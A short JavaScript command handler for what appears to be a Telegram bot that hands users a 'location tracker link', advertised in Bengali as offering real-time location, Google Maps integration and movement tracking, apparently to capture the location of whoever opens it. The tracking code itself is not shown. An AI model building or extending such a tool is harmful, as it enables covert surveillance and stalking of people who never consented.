const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const generator = require('../utils/generator');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  try {
    const auth = await authMiddleware(msg);
    if (!auth.allowed) return;
    
    const rateLimit = rateLimiter(userId);
    if (!rateLimit.allowed) return;
    
    const link = await generator.generateLocationLink(userId);
    
    auth.user.totalLinks += 1;
    await auth.user.save();
    
    const message = `✅ 𝐋𝐎𝐂𝐀𝐓𝐈𝐎𝐍 𝐓𝐑𝐀𝐂𝐊𝐄𝐑 𝐋𝐈𝐍𝐊\n\n` +
      `🔗 আপনার লিঙ্ক:\n${link.url}\n\n` +
      `📍 ফিচার:\n` +
      `• রিয়েল-টাইম লোকেশন\n` +
      `• গুগল ম্যাপ ইন্টিগ্রেশন\n` +
      `• মুভমেন্ট ট্র্যাকিং\n` +
      `• এসিুরেসি লেভেল\n\n` +
      `⏰ এক্সপায়ার: ৭ দিন`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('Location Command Error:', error);
  }
};